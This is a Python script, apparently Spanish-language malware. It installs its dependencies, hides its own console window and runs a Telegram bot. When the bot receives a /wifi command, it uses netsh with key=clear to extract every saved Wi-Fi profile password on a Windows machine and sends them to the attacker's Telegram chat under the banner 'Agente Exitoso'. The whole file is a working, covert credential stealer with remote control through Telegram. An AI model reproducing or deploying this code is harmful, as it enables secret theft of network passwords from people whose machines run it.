import subprocess
import sys
def instalar_librerias():
    librerias = [
        'python-telegram-bot',
        'pywin32'
    ]
    for libreria in librerias:
        try:
            print(f"Instalando {libreria}...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", libreria])
            print(f"{libreria} instalado correctamente.")
        except subprocess.CalledProcessError as e:
            print(f"Error al instalar {libreria}: {e}")
if __name__ == "__main__":
    instalar_librerias()
import subprocess
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
import win32console
import win32gui
ventana_oculta = win32console.GetConsoleWindow()
win32gui.ShowWindow(ventana_oculta, 0)
TOKEN = "REEMPLACE_TOKEN_BOT_API"
async def wifi(update: Update, context: CallbackContext) -> None:
    profiles = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], universal_newlines=True).split('\n')
    message = "━━━━━━━━━━━━━━━━━━━━━━━\n"
    message += "🕵️‍♂️ *𝕬𝖌𝖊𝖓𝖙𝖊 𝕰𝖝𝖎𝖙𝖔𝖘𝖔!*\n"
    message += "━━━━━━━━━━━━━━━━━━━━━━━\n"
    message += "🔐 𝕰𝖓𝖈𝖔𝖓𝖙𝖗𝖆𝖉𝖔𝖘 🔐\n"
    for line in profiles:
        if "Perfil de todos los usuarios" in line:
            name = line.split(":")[1].strip()
            try:
                output_key = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', f'name="{name}"', 'key=clear'], universal_newlines=True)
                key_content = next((l.split(':')[1].strip() for l in output_key.split('\n') if "Contenido de la clave" in l), '')
                if key_content:
                    message += f"📶 {name} : {key_content}\n"
            except subprocess.CalledProcessError:
                pass
    message += "━━━━━━━━━━━━━━━━━━━━━━━"
    await context.bot.send_message(chat_id=update.effective_chat.id, text=message, parse_mode='Markdown')
application = Application.builder().token(TOKEN).build()
application.add_handler(CommandHandler('wifi', wifi))
application.run_polling()
